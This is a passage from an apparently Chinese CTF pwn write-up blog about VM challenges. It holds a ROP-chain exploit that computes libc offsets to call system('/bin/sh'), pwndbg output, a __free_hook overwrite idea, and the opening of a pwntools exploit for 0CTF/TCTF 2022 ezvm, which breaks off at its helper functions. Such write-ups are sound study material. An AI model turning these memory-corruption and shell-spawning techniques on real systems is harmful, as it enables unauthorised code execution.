</span></span><span class="line"><span class="cl"><span class="c1"># 27:0138│+008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span> <span class="o">=</span> <span class="n">store</span><span class="p">(</span><span class="mh">0xd38</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#libc地址给寄存器0</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="n">base_addr</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#system的偏移给寄存器1，20这里随便设置，不和low一样就行</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#binsh的偏移给寄存器2</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#ret的偏移给寄存器3</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#pop_rdi_ret偏移给寄存器4</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#寄存器5=寄存器0+system偏移=system地址</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="c1">#寄存器6=寄存器0+binsh偏移=binsh地址</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">sub</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="c1">#寄存器7=寄存器0-ret偏移=ret地址</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#寄存器8=寄存器0+pop_rdi_ret偏移=pop_rdi_ret地址</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">load</span><span class="p">(</span><span class="n">dest_offset</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#pop_rdi_ret</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">load</span><span class="p">(</span><span class="n">dest_offset</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="c1">#binsh</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">load</span><span class="p">(</span><span class="n">dest_offset</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="c1">#ret</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">load</span><span class="p">(</span><span class="n">dest_offset</span><span class="o">+</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#system</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x2e586</span><span class="p">)</span> <span class="c1">#system</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1a1265</span><span class="p">)</span> <span class="c1">#binsh</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x199b</span><span class="p">)</span> <span class="c1">#ret</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xe55c1</span><span class="p">)</span> <span class="c1">#pop_rdi_ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;opcode: &#39;</span><span class="p">,</span><span class="n">opcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># sbase 0x40c0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 0x7fff2d02dd50 #main栈帧中存储opcode地址</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0x7fff2d02dc30 #execute 中stack地址</span>
</span></span><span class="line"><span class="cl"><span class="c1">#之间偏移为0x120</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#system = 寄存器0 + 0x2e586</span>
</span></span><span class="line"><span class="cl"><span class="c1">#binsh = 寄存器0 + 0x1a1265</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ret = 寄存器0 - 0x199b</span>
</span></span><span class="line"><span class="cl"><span class="c1">#pop_rdi_ret = 寄存器0 + 0xe55c1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; sbase 0x40c0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main+122) ◂— mov edi, eax</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 01:0008│         0x6127080540c8 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 02:0010│         0x6127080540d0 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 03:0018│         0x6127080540d8 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 04:0020│         0x6127080540e0 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 05:0028│         0x6127080540e8 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 06:0030│         0x6127080540f0 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 07:0038│         0x6127080540f8 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 08:0040│         0x612708054100 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 09:0048│         0x612708054108 ◂— 0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p &amp;system</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $1 = (int (*)(const char *)) 0x759f7fe58750 &lt;__libc_system&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; search &#34;/bin/sh&#34;                                                       </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Searching for byte: b&#39;/bin/sh&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># libc.so.6       0x759f7ffcb42f 0x68732f6e69622f /* &#39;/bin/sh&#39; */</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p/x 0x759f7fe58750 - 0x759f7fe2a1ca</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $2 = 0x2e586</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p/x 0x759f7ffcb42f - 0x759f7fe2a1ca</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $3 = 0x1a1265</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#ret指令</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000002882f : ret </span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p/x 0x759f7fe2a1ca - 0x759f7fe2882f</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $6 = 0x199b</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 寄存器1 - binsh地址 = 0x199b</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#pop_rdi_ret</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000010f78b : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pwndbg&gt; p/x  0x759f7ff0f78b - 0x759f7fe2a1ca</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $8 = 0xe55c1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pop_rdi_ret - 寄存器0 = 0xe55c1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="2020网鼎杯青龙组-boom1" class="headerLink">
    <a href="#2020%e7%bd%91%e9%bc%8e%e6%9d%af%e9%9d%92%e9%be%99%e7%bb%84-boom1" class="header-mark"></a>2020网鼎杯青龙组-boom1</h2><p><a href="https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&amp;u_asig=1a0c381017440330108046584e0135" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&u_asig=1a0c381017440330108046584e0135</a></p>
<p>编译器类vmpwn</p>
<p>大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。</p>
<p><code>malloc(0x40000u);</code>会走mmap，申请的变量和libc的偏移是固定的</p>
<blockquote>
<p>我们可以定义一个变量，从这个变量的地址寻址到<code>__free_hook</code>和<code>system</code>函数，将后者覆写到前者，再调用<code>free('/bin/sh')</code>即可。</p>
</blockquote>
<h2 id="0ctftctf-2022-ezvm" class="headerLink">
    <a href="#0ctftctf-2022-ezvm" class="header-mark"></a>0CTF/TCTF 2022 ezvm</h2><p>别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm</p>
<p>指令梳理：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">0</span> <span class="n">push</span><span class="p">:</span> <span class="err">把</span><span class="n">memory的数据压入栈中</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">pop</span><span class="p">:</span> <span class="err">栈中数据弹出到</span><span class="n">memory</span>
</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">-</span><span class="mi">12</span> <span class="err">：</span> <span class="err">对栈中数据进行加减乘除等操作，并把</span><span class="n">sp</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="mi">13</span> <span class="p">:</span> <span class="err">判断栈顶是否为</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">14</span><span class="o">-</span><span class="mi">16</span><span class="err">：</span> <span class="n">jmp</span> <span class="n">jz</span> <span class="n">jnz</span> 
</span></span><span class="line"><span class="cl"><span class="mi">17</span><span class="o">-</span><span class="mi">19</span><span class="p">:</span> <span class="err">比较指令</span>
</span></span><span class="line"><span class="cl"><span class="mi">20</span> <span class="n">mov</span><span class="p">:</span> <span class="err">写</span><span class="mi">8</span><span class="err">字节到</span><span class="n">bss段</span><span class="err">（类似寄存器）</span>
</span></span><span class="line"><span class="cl"><span class="mi">21</span> <span class="n">store</span><span class="p">:</span><span class="err">指定寄存器中数据写入到</span><span class="n">memory区域</span>
</span></span><span class="line"><span class="cl"><span class="mi">22</span> <span class="nb">load</span><span class="p">:</span><span class="err">把</span><span class="n">memory中的数据写入到指定寄存器</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>交互：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">push</span>    <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span>              <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="c1">#压入寄存器的内容到栈</span>
</span></span><span class="line"><span class="cl"><span class="n">and_f</span>   <span class="o">=</span>   <span class="k">lambda</span>                  <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">nz</span>      <span class="o">=</span>   <span class="k">lambda</span> <span class="n">add_ip</span>           <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">add_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">jnz</span>     <span class="o">=</span>   <span class="k">lambda</span> <span class="n">add_ip</span>           <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">add_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mov</span>     <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span><span class="p">,</span><span class="n">imm</span>          <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x14</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span> <span class="c1">#imm-&gt;寄存器</span>
</span></span><span class="line"><span class="cl"><span class="n">store</span>   <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span><span class="p">,</span><span class="n">memory</span>       <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x15</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="c1">#寄存器-&gt;memory </span>
</span></span><span class="line"><span class="cl"><span class="n">load</span>    <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span><span class="p">,</span><span class="n">memory</span>       <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x16</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="c1">#mrmory-&gt;寄存器             </span>
</span></span><span class="line"><span class="cl"><span class="n">exit_f</span>  <span class="o">=</span>   <span class="k">lambda</span>                  <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>关键点在于这个malloc会把size左移3个bit，传入<code>0x2000000000030000</code>就能越界写</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000002353</span>                 <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">size_1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000002357</span>                 <span class="nf">shl</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000000235</span><span class="nf">B</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_10</span><span class="p">],</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000000235</span><span class="nf">F</span>                 <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000002363</span>                 <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>        <span class="c1">; size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">0000000000002366</span>                 <span class="nf">call</span>    <span class="no">_malloc</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>思路：</p>
<ul>
<li>free一个堆块进unsorted bin，memory 区域会留下libc</li>
<li>爆破出libc</li>
<li>利用<code>__call_tls_dtors</code>来getshell</li>
</ul>
<h3 id="exp-3" class="headerLink">
    <a href="#exp-3" class="header-mark"></a>exp</h3><p>不知道为什么最后<code>bye bye</code>的时候退不出去。。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">,</span><span class="s2">&#34;-p&#34;</span><span class="p">,</span><span class="s2">&#34;65&#34;</span><span class="p">,</span><span class="s2">&#34;-b&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># address = &#39;./pwn_patched&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ss</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># lg      = lambda s,addr		        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s,addr))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>			        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
